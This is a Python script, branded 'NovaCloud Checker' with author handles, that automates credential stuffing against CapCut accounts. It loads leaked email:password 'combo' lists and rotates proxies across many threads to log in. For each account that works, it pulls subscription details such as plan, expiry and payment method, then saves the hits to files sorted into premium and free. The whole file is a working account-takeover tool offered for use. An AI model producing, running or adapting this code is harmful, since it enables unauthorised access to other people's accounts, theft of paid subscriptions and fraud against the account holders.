

import sys
import os
import requests
import time
import json
import random
import urllib.parse
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"'
}

stats = {"PREMIUM": 0, "FREE": 0, "BAD": 0, "ERROR": 0, "TOTAL": 0}
lock = threading.Lock()

def parse_proxy(proxy_line):
    try:
        if proxy_line.count(':') == 3:
            parts = proxy_line.split(':')
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return f"http://{proxy_line}"
    except:
        return None

def extract_string(source, left, right):
    try:
        start = source.find(left)
        if start == -1: return ""
        start += len(left)
        end = source.find(right, start)
        if end == -1: return ""
        return source[start:end].strip()
    except:
        return ""

def format_date(timestamp):
    try:
        if not timestamp: return "N/A"
        return datetime.fromtimestamp(int(timestamp)).strftime("%Y-%m-%d")
    except:
        return "N/A"

def check_account(email, password, proxies):
    global stats
    status = "ERROR"
    log_text = ""
    proxy_dict = None

    for attempt in range(3):
        if proxies:
            prx = random.choice(proxies)
            proxy_dict = {'http': prx, 'https': prx}

        try:
            session = requests.Session()
            email_enc = urllib.parse.quote(email)
            pass_enc = urllib.parse.quote(password)

            login_url = "https://www.capcut.com/passport/web/email/login/?aid=348188&account_sdk_source=web&passport_jssdk_version=1.0.7-beta.2&language=en&verifyFp=verify_mbf3u5tl_oZllcT6P_XZ9g_4WNW_A2UT_Sibk0A4qyiRE"
            login_headers = HEADERS.copy()
            login_headers.update({
                "host": "www.capcut.com",
                "content-type": "application/x-www-form-urlencoded",
                "x-tt-passport-csrf-token": "d02afa0bff281ee9dcdc36aa3aa38d8f",
                "origin": "https://www.capcut.com",
                "referer": "https://www.capcut.com/login"
            })
            login_data = f"mix_mode=1&email={email_enc}&password={pass_enc}&fixed_mix_mode=1"

            req = session.post(login_url, data=login_data, headers=login_headers, proxies=proxy_dict, timeout=10)
            res = req.text

            if '"message":"success"' in res or '"app_id"' in res or '"user_id"' in res:
                app_id = extract_string(res, '"app_id":', ',"')
                screen_name = extract_string(res, '"screen_name":"', '"')

                sub_url = "https://commerce-api-sg.capcut.com/commerce/v3/trade/subscription_infos"
                sub_data = f'{{"scene":["vip"],"vip_levels":["vip"],"app_id":{app_id}}}'
                
                sub_headers = HEADERS.copy()
                sub_headers.update({
                    "Host": "commerce-api-sg.capcut.com",
                    "sign-ver": "1",
                    "sign": "2832a2ea2f27fad70d2d050280945b91",
                    "Content-Type": "application/json",
                    "appid": app_id,
                    "device-time": str(int(time.time())),
                    "Origin": "https://www.capcut.com"
                })

                sub_req = session.post(sub_url, data=sub_data, headers=sub_headers, proxies=proxy_dict, timeout=10)
                sub_res = sub_req.text

                plan = extract_string(sub_res, '"display_subscription_info":"', '",')
                amount = extract_string(sub_res, '"amount":', ',"')
                currency = extract_string(sub_res, '"currency_code":"', '",')
                pay_method = extract_string(sub_res, '"payment_method":"', '"')
                expiry = format_date(extract_string(sub_res, '"vip_end_time":', ',"'))

                if plan and "Pro" in plan:
                    status = "PREMIUM"
                elif '"is_vip":true' in sub_res:
                    status = "PREMIUM"
                else:
                    status = "FREE"

                log_text = f"{email}:{password} | Name: {screen_name or 'N/A'} | Plan: {plan or 'No Sub'} | Exp: {expiry}"
                break 

            elif 'doesn\'t match' in res or 'Username or password' in res or '"error_code":1009' in res or '"message":"error"' in res:
                status = "BAD"
                break 
            else:
                status = "ERROR"
                time.sleep(1.5) 

        except Exception:
            status = "ERROR"
            time.sleep(1.5) 

    with lock:
        stats["TOTAL"] += 1
        stats[status] += 1
        
        if status == "PREMIUM":
            print(f"{Fore.GREEN}[+] {log_text}{Style.RESET_ALL}")
            with open("Nova_PREMIUM.txt", "a", encoding="utf-8") as f:
                f.write(f"{log_text} | Author: @NovaCloudChannels\n")
        
        elif status == "FREE":
            print(f"{Fore.YELLOW}[*] {log_text}{Style.RESET_ALL}")
            with open("Nova_FREE.txt", "a", encoding="utf-8") as f:
                f.write(f"{log_text} | Author: @NovaCloudChannels\n")
        
        if os.name == 'nt':
            os.system(f"title NovaCloud Checker - Checked: {stats['TOTAL']} ^| Premium: {stats['PREMIUM']} ^| Free: {stats['FREE']} ^| Bad: {stats['BAD']} ^| Error: {stats['ERROR']}")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + r"""
  _   _                 ____ _                 _ 
 | \ | | _____   ____ _/ ___| | ___  _   _  __| |
 |  \| |/ _ \ \ / / _` | |   | |/ _ \| | | |/ _` |
 | |\  | (_) \ V / (_| | |___| | (_) | |_| | (_| |
 |_| \_|\___/ \_/ \__,_|\____|_|\___/ \__,_|\__,_|
    """ + Style.RESET_ALL)
    print(f"{Fore.YELLOW}👑 Coded by @lurexanovacloud | CMD Edition{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")

    combo_path = input(f"{Fore.WHITE}[?] Combo File (e.g., combo.txt): {Style.RESET_ALL}").strip()
    try:
        with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
            combos = [line.strip() for line in f if ":" in line]
        print(f"{Fore.GREEN}[+] {len(combos)} Combos Loaded.{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}[!] Combo file not found!{Style.RESET_ALL}")
        return

    proxy_path = input(f"{Fore.WHITE}[?] Proxy File (Press Enter to skip): {Style.RESET_ALL}").strip()
    proxies = []
    if proxy_path:
        try:
            with open(proxy_path, "r", encoding="utf-8", errors="ignore") as f:
                raw_proxies = [line.strip() for line in f if line.strip()]
                proxies = [parse_proxy(p) for p in raw_proxies if parse_proxy(p)]
            print(f"{Fore.GREEN}[+] {len(proxies)} Proxies Loaded.{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[!] Proxy file could not be read, continuing without proxies.{Style.RESET_ALL}")
    
    threads_count = input(f"{Fore.WHITE}[?] Threads (Recommended: 50): {Style.RESET_ALL}").strip()
    threads_count = int(threads_count) if threads_count.isdigit() else 50

    print(f"\n{Fore.CYAN}🚀 Scan Starting... (Only Hits will be printed){Style.RESET_ALL}\n")
    time.sleep(1)

    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for combo in combos:
            if ':' in combo:
                email, password = combo.split(':', 1)
                executor.submit(check_account, email.strip(), password.strip(), proxies)

    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Premium: {stats['PREMIUM']}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Free: {stats['FREE']}{Style.RESET_ALL}")
    print(f"{Fore.RED}[-] Bad: {stats['BAD']}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}[!] Error: {stats['ERROR']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    input("\nPress Enter to exit...")

if __name__ == '__main__':
    main()

